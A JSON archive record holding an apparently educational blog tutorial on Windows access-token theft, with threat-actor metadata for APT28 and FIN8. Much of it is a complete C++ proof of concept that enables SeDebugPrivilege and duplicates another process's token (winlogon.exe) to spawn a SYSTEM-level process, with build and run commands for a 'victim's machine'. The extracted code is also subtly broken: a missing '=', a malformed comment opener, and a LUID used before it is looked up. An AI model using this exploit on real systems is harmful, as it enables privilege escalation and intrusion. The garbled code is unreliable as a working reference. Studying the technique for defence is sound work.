{
    "id": "d6c9b61c-3617-4aa3-9b94-5a2e592e44da",
    "created_at": "2023-01-12T15:05:59.23882Z",
    "updated_at": "2025-03-27T02:15:24.895464Z",
    "deleted_at": null,
    "sha1_hash": "75db4871c4250b6a5cf1ffcc5b786ca444f28c8a",
    "title": "2022-09-25 - APT techniques- Access Token manipulation. Token theft. Simple Cplusplus example.",
    "authors": "",
    "file_creation_date": "2022-11-28T19:02:12Z",
    "file_modification_date": "2022-11-28T19:02:12Z",
    "file_size": 1606556,
    "plain_text": "# APT techniques: Access Token manipulation. Token theft. Simple C++ example.\n\n**[cocomelonc.github.io/tutorial/2022/09/25/token-theft-1.html](https://cocomelonc.github.io/tutorial/2022/09/25/token-theft-1.html)**\n\nSeptember 25, 2022\n\n7 minute read\n\n﷽\n\nHello, cybersecurity enthusiasts and white hackers!\n\nThis post is the result of my own research into one of the interesting classic APT techniques:\nToken theft.\n\n## windows tokens and privilege constants\n\nThe relationship between login sessions and access tokens is the most important idea to\nmaster to comprehend authentication in Windows settings. A logon session is used to\nindicate a user’s presence on a computer: it begins when a user is successfully\nauthenticated and ends when the user logs off.\n\n\n-----\n\nOnce the user has been authenticated successfully, the [Local Security Authority (LSA) will](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication)\ngenerate a new login session and an access token.\n\nEvery new logon session is distinguished by a `64-bit locally unique identifier ( LUID ),`\nalso known as the logon ID, and every access token must include an Authentication Id (or\n```\nAuthId ) parameter that identifies the origin/linked logon session using this LUID .\n\n```\nThe primary purpose of an access token is to serve as a “volatile store for security settings\nconnected with the login session” that may be dynamically updated. In this sense, when\nmaking security decisions, Windows developers interact with the access token that\nrepresents the login session (which is “hidden” in lsass)\n\nTherefore, a developer may duplicate existing tokens via `DuplicateTokenEx :`\n\n\n-----\n\n```\nBOOL DuplicateTokenEx(\n\n HANDLE            hExistingToken,\n\n DWORD            dwDesiredAccess,\n\n LPSECURITY_ATTRIBUTES    lpTokenAttributes,\n\n SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,\n\n TOKEN_TYPE          TokenType,\n\n PHANDLE           phNewToken\n\n);\n\n```\n, calling thread impersonate the security context of a logged-on user via\n```\nImpersonateLoggedOnUser :\nBOOL ImpersonateLoggedOnUser(\n\n HANDLE hToken\n\n);\n\n```\netc.\n\nA token also contains a logon `SID (Security Identifier) that identifies the current logon`\nsession.\n\nThe type of system actions that a user account may conduct is determined by their\n[privileges. User and group rights are assigned by an administrator. Each user’s rights consist](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)\nof those provided to both the user and the groups to which the user belongs.\n\nThe access token routines that retrieve and modify privileges utilize the locally unique\nidentifier ( LUID ) type to identify privileges.\nWe can use the `LookupPrivilegeValue`\nfunction to determine the `LUID for a privilege constant on the local system:`\n```\nBOOL LookupPrivilegeValueA(\n\n LPCSTR lpSystemName,\n\n LPCSTR lpName,\n\n [PLUID lpLuid\n\n);\n\n```\nYou can see all this info via command:\n```\nwhoami /all\n\n```\n\n-----\n\nor using [Process Explorer:](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer)\n\n\n-----\n\nThere are two types of access tokens:\n\nPrimary (sometimes called Delegate)\nImpersonation\n\nWhen a user logs into a Windows Domain, primary tokens are produced. This may be\naccomplished by physically accessing a Windows computer or remotely through Remote\nDesktop.\n\nTypically, impersonation tokens do something in a different security context than the\nprocess that initiated them. For mounting network shares or domain logon scripts, these noninteractive tokens are utilized.\n\n## local administrator\n\nLet’s go to open two command prompts, one with administrator privileges:\n\n\n-----\n\none without:\n\n\n-----\n\nand compare via Process Explorer:\n\n\n-----\n\nAs you can see, when we run `cmd.exe with Administrator privileges the`\n```\nBUILTIN\\Administrators flag is set to Owner . Which means cmd.exe is running in the\n\n```\nsecurity context of Administrator privileges.\n\nWhat does this difference mean in the context of the token theft technique? It is mean that\nwe may carry out the following operations:\n\nimpersonate a client upon authentication using `SeImpersonatePrivilege`\nwe can debug programs.\n\n## SeDebugPrivilege\n\nIf a token has the `SeDebugPrivilege privilege enabled it is enable a user to bypass/skip`\nthe access check in the kernel for a given object. You can retrieve a handle to any process in\nthe system by enabling the `SeDebugPrivilege in the calling process. The calling process`\n\n\n-----\n\ncan then call the `OpenProcess() Win32 API to obtain a handle with`\n```\nPROCESS_ALL_ACCESS, PROCESS_QUERY_INFORMATION, or\nPROCESS_QUERY_LIMITED_INFORMATION .\n\n## technique. practical example\n\n```\nCreating a new process using a “stolen” token from another process is one of the strategies\nof token manipulation.\nThis occurs when a token of an existing access token present in one\nof the active processes on the target host is extracted, duplicated, and then used to create a\nnew process, so granting the new process the privileges of the stolen token.\n\nThe following is an overview of the token theft procedure that will be carried out in this\npractical case:\n\nFirst of all, sometimes you do have `SeDebugPrivilege in your current set of privileges, but`\nit is disabled, so you must turn it on:\n\n\n-----\n\n```\n// set privilege\n\nBOOL setPrivilege(LPCTSTR priv) {\n\n HANDLE token;\n\n TOKEN_PRIVILEGES tp;\n\n LUID luid;\n\n BOOL res = TRUE;\n\n tp.PrivilegeCount = 1;\n\n tp.Privileges[0].Luid = luid;\n\n tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n\n if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;\n\n if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token)) res =\nFALSE;\n\n if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES),\n(PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;\n\n printf(res ? \"successfully enable %s :)\\n\" : \"failed to enable %s :(\\n\", priv);\n\n return res;\n\n}\n\n```\nThen, open a process whose access token you wish to steal and obtain a handle to that\nprocess’s access token:\n```\n// get access token\n\nHANDLE getToken(DWORD pid) {\n\n HANDLE cToken = NULL;\n\n HANDLE ph = NULL;\n\n if (pid == 0) {\n\n  ph = GetCurrentProcess();\n\n } else {\n\n  ph = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid);\n\n }\n\n if (!ph) cToken = (HANDLE)NULL;\n\n printf(ph ? \"successfully get process handle :)\\n\" : \"failed to get process handle\n:(\\n\");\n\n BOOL res = OpenProcessToken(ph, MAXIMUM_ALLOWED, &cToken);\n\n if (!res) cToken = (HANDLE)NULL;\n\n printf((cToken != (HANDLE)NULL) ? \"successfully get access token :)\\n\" : \"failed to\nget access token :(\\n\");\n\n return cToken;\n\n}\n\n\n```\nMake a duplicate of the access token present in that process:\n```\n//...\n\nres = DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,\nTokenPrimary, &dToken);\n\n//...\n\n\n```\nFinally, with the newly acquired access token, initiate a new process:\n\n\n-----\n\n```\n//...\n\nSTARTUPINFOW si;\n\nPROCESS_INFORMATION pi;\n\nBOOL res = TRUE;\n\nZeroMemory(&si, sizeof(STARTUPINFOW));\n\nZeroMemory(&pi, sizeof(PROCESS_INFORMATION));\n\nsi.cb = sizeof(STARTUPINFOW);\n\n//...\n\nres = CreateProcessWithTokenW(dToken, LOGON_WITH_PROFILE, app, NULL, 0, NULL, NULL,\n&si, &pi);\n\n//...\n\n```\nSo, the full source code of this logic is look like this:\n\n\n-----\n\n```\n/\nhack.cpp\n\ntoken theft\n\nenable set of priv\n\nauthor: @cocomelonc\n\nhttps://cocomelonc.github.io/malware/2022/09/25/token-theft-1.html\n\n*/\n#include <windows.h>\n\n#include <stdio.h>\n\n#include <iostream>\n\n// set privilege\n\nBOOL setPrivilege(LPCTSTR priv) {\n\n HANDLE token;\n\n TOKEN_PRIVILEGES tp;\n\n LUID luid;\n\n BOOL res = TRUE;\n\n tp.PrivilegeCount = 1;\n\n tp.Privileges[0].Luid = luid;\n\n tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n\n if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;\n\n if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token)) res =\nFALSE;\n\n if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES),\n(PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;\n\n printf(res ? \"successfully enable %s :)\\n\" : \"failed to enable %s :(\\n\", priv);\n\n return res;\n\n}\n\n// get access token\n\nHANDLE getToken(DWORD pid) {\n\n HANDLE cToken = NULL;\n\n HANDLE ph = NULL;\n\n if (pid == 0) {\n\n  ph = GetCurrentProcess();\n\n } else {\n\n  ph = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid);\n\n }\n\n if (!ph) cToken = (HANDLE)NULL;\n\n printf(ph ? \"successfully get process handle :)\\n\" : \"failed to get process handle\n:(\\n\");\n\n BOOL res = OpenProcessToken(ph, MAXIMUM_ALLOWED, &cToken);\n\n if (!res) cToken = (HANDLE)NULL;\n\n printf((cToken != (HANDLE)NULL) ? \"successfully get access token :)\\n\" : \"failed to\nget access token :(\\n\");\n\n return cToken;\n\n}\n\n// create process\n\nBOOL createProcess(HANDLE token, LPCWSTR app) {\n\n```\n\n-----\n\n```\n HANDLE dToken NULL;\n\n STARTUPINFOW si;\n\n PROCESS_INFORMATION pi;\n\n BOOL res = TRUE;\n\n ZeroMemory(&si, sizeof(STARTUPINFOW));\n\n ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));\n\n si.cb = sizeof(STARTUPINFOW);\n\n res = DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,\nTokenPrimary, &dToken);\n\n printf(res ? \"successfully duplicate process token :)\\n\" : \"failed to duplicate\nprocess token :(\\n\");\n\n res = CreateProcessWithTokenW(dToken, LOGON_WITH_PROFILE, app, NULL, 0, NULL, NULL,\n&si, &pi);\n\n printf(res ? \"successfully create process :)\\n\" : \"failed to create process :(\\n\");\n\n return res;\n\n}\n\nint main(int argc, char** argv) {\n\n if (!setPrivilege(SE_DEBUG_NAME)) return -1;\n\n DWORD pid = atoi(argv[1]);\n\n HANDLE cToken = getToken(pid);\n\n if (!createProcess(cToken, L\"C:\\\\Windows\\\\System32\\\\mspaint.exe\")) return -1;\n\n return 0;\n\n}\n\n```\nThis code is just dirty PoC, for simplicity, I run `mspaint.exe .`\n\n## demo\n\nLet’s go to see everything in action. Compile our PoC:\n```\nx86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -I/usr/share/mingw-w64/include/ -s ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-allconstants -static-libstdc++ -static-libgcc -fpermissive\n\n\n```\nThen, run it at the victim’s machine:\n```\n.\\hack.exe <PID>\n\n```\n\n-----\n\nAs a local administrator (in a high-integrity environment), you may steal the `winlogon.exe`\n```\n(PID: 560) access token to create a new process as SYSTEM :\n\n```\n\n-----\n\n-----\n\nThis is because successful token theft. Perfect!\n\nMaybe for some specialists, this code will not be new, but I think it can be taken as the basis\nfor more serious projects when automating red team scenarios, also for entry level.\n\n## impersonate\n\nAs I wrote earlier, we also able to use `ImpersonateLoggedOnUser to permit our current`\nthread to assume the identity of another logged-in user (impersonate). Until\n```\nRevertToSelf() is invoked or the thread ends, the thread will continue to impersonate the\n\n```\nlogged-on user. Let’s look at that in the next post.\n\n[This attack technique is used by APT28 and](https://attack.mitre.org/groups/G0007/) [FIN8 groups in the wild.](https://attack.mitre.org/groups/G0061/)\n\n\n-----\n\nI hope this post least a little useful for entry level cyber security specialists (and possibly\neven professionals), also spreads awareness to the blue teamers of this interesting\ntechnique, and adds a weapon to the red teamers arsenal.\n\n[Local Security Authority](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication)\n[Privilege Constants](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)\n[LookupPrivilegeValue](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluea)\n[AdjustTokenPrivileges](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges)\n[OpenProcessToken](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken)\n[DuplicateTokenEx](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetoken)\n[OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)\n[CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)\n[ATT&CK MITRE: Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001/)\n[APT28](https://attack.mitre.org/groups/G0007/)\n[FIN8](https://attack.mitre.org/groups/G0061/)\n[source code on github](https://github.com/cocomelonc/2022-09-25-token-theft-1)\n\nThis is a practical case for educational purposes only.\n\nThanks for your time happy hacking and good bye!\n\n_PS. All drawings and screenshots are mine_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-09-25 - APT techniques- Access Token manipulation. Token theft. Simple Cplusplus example..pdf"
    ],
    "report_names": [
        "2022-09-25 - APT techniques- Access Token manipulation. Token theft. Simple Cplusplus example..pdf"
    ],
    "threat_actors": [
        {
            "id": "72d09c17-e33e-4c2f-95db-f204848cc797",
            "created_at": "2022-10-25T15:50:23.832551Z",
            "updated_at": "2025-03-27T02:00:55.554841Z",
            "deleted_at": null,
            "main_name": "FIN8",
            "aliases": [
                "FIN8",
                "Syssphinx"
            ],
            "source_name": "MITRE:FIN8",
            "tools": [
                "BADHATCH",
                "PUNCHBUGGY",
                "Ragnar Locker",
                "PUNCHTRACK",
                "dsquery",
                "Nltest",
                "Sardonic",
                "PsExec",
                "Impacket"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "fc80a724-e567-457c-82bb-70147435e129",
            "created_at": "2022-10-25T16:07:23.624289Z",
            "updated_at": "2025-03-27T02:02:09.892602Z",
            "deleted_at": null,
            "main_name": "FIN8",
            "aliases": [
                "ATK 113",
                "Syssphinx"
            ],
            "source_name": "ETDA:FIN8",
            "tools": [
                "ALPHV",
                "ALPHVM",
                "BadHatch",
                "BlackCat",
                "Noberus",
                "PSVC",
                "PUNCHTRACK",
                "PoSlurp",
                "Powersniff",
                "PunchBuggy",
                "Ragnar Locker",
                "RagnarLocker",
                "Sardonic",
                "ShellTea"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "5bdde906-0416-42ee-9100-5ebd95dda77a",
            "created_at": "2023-01-06T13:46:38.601977Z",
            "updated_at": "2025-03-27T02:00:02.870694Z",
            "deleted_at": null,
            "main_name": "FIN8",
            "aliases": [
                "ATK113",
                "G0061"
            ],
            "source_name": "MISPGALAXY:FIN8",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535959,
    "ts_updated_at": 1743041724,
    "ts_creation_date": 1669662132,
    "ts_modification_date": 1669662132,
    "files": {
        "pdf": "https://archive.orkl.eu/75db4871c4250b6a5cf1ffcc5b786ca444f28c8a.pdf",
        "text": "https://archive.orkl.eu/75db4871c4250b6a5cf1ffcc5b786ca444f28c8a.txt",
        "img": "https://archive.orkl.eu/75db4871c4250b6a5cf1ffcc5b786ca444f28c8a.jpg"
    }
}